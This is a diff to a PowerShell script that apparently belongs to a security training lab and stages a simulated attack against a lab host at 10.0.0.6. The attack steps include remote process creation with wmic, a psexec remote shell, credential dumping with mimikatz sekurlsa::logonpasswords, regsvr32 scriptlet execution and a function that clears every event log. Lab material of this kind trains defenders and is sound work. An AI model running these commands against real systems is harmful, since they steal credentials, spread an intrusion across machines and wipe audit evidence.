@@ -57,18 +57,24 @@ function clear-all-event-logs ($computerName="localhost")
    Get-EventLog -ComputerName $computername -list
 }
 
-$userEmail = "{username}";
+mkdir c:\job -ea SilentlyContinue;
+
+mkdir c:\tools -ea SilentlyContinue;
+
+cd "C:\labfiles\#WORKSHOP_NAME#\artifacts\day-02"
+
+$userEmail = "#USERNAME#";
 
 SendEmail $userEmail;
 
 #Run the attack
-wmic /node:"targetcomputer" process call create "cmd.exe /c copy c:\windows\system32\svchost.exe c:\job\svchost.exe";
+wmic /node:"10.0.0.6" process call create "cmd.exe /c copy c:\windows\system32\svchost.exe c:\job\svchost.exe";
 
-wmic /node:"targetcomputer" process call create "cmd.exe /c c:\job\svchost.exe";
+wmic /node:"10.0.0.6" process call create "cmd.exe /c c:\job\svchost.exe";
 
 cd c:/tools;
 
-psexec /accepteula \\targetcomputer cmd
+psexec /accepteula \\10.0.0.6 cmd
 
 hostname
 
@@ -77,6 +83,8 @@ mimikatz.exe "priviledge::debug" "sekurlsa::logonpasswords" "exit" >> c:\tools\t
 regsvr32.exe /s /u /i:test.sct scrobj.dll
 
 regsvr32.exe /s /u /i:test.sct PrintIsolationProxy.dll
+
+Copy-Item -path "C:\labfiles\#WORKSHOP_NAME#\artifacts\day-02\logs-03" "c:\logs"
 
 clear-all-event-logs
 
